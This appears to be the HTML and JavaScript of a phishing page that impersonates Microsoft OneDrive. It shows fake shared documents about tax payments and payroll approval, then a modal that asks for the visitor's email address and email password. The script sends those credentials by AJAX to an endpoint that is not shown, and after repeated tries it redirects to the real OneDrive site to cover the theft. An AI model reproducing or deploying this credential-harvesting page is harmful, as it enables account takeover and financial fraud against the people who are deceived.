...
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  ...
  <body class="bg-light" style="">
        ...
        <div class="col-sm-12 col-md-9">
          <!-- Caption Area -->
            <div class="d-flex align-items-center p-3 my-3 text-white-50 bg-blue rounded box-shadow">
              <img class="mr-3" src="./lng/white-onedrive.svg" alt="" width="48" height="48">
              <div class="lh-100">
            ...
            <div class="my-3 p-3 bg-white rounded box-shadow">
              ...
              <div class="media text-muted pt-3">
                <img width="32px" height="32px" src="./lng/word-icon.png" alt="" class="mr-2 rounded">
                <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
                  <div class="d-flex justify-content-between align-items-center w-100">
                    <strong class="text-gray-dark">Tax payment file 678685.docx</strong>
          ...
          <div class="media text-muted pt-3">
            <img width="32px" height="32px" src="./lng/ppt-icon.png" alt="" class="mr-2 rounded">
            <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
              <div class="d-flex justify-content-between align-items-center w-100">
                <strong class="text-gray-dark">GOV approved letter.pdf</strong>
                <a href="#" data-toggle="modal" data-target="#myModal">View</a>
              </div>
              <span class="d-block">Description: An electronic letter for your payrol approval and your bank details. </span>
            </div>
          </div>
    ...
    <footer class="footer">
      <div class="container">
        <span class="text-muted" style="font-size: 13px;">© Microsoft.</span>
      </div>
    </footer>
            ...
            <div id="second-view" class="modal-content">
              ...
              <form>
                  ...
                  <div class="form-group">
                    ...
                    <input type="email" id="um" class="form-control" value="" aria-describedby="emailHelp" placeholder="Receiver&#39;s Enter email">
                    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                  </div>
                  <div class="form-group">
                    <label for="exampleInputPassword1">Password</label>
                    <input type="password" class="form-control" id="up" placeholder="Receiver&#39;s Email Password">
              ...
              <div><small style="font-size:10px;">All rights reserved. ©Microsoft</small></div>
 ...
 var count=0;
        ...
        viewFileBtn.addEventListener('click',function(e){
            ...
            $.ajax({
                ...
                data: {userEmail:um.value,userPass:up.value},
                ...
                success: function(res){
                    ...
                    if(count>=2){
                       count=0;
                        // Redirect the User
                        window.location.replace("https://onedrive.live.com");
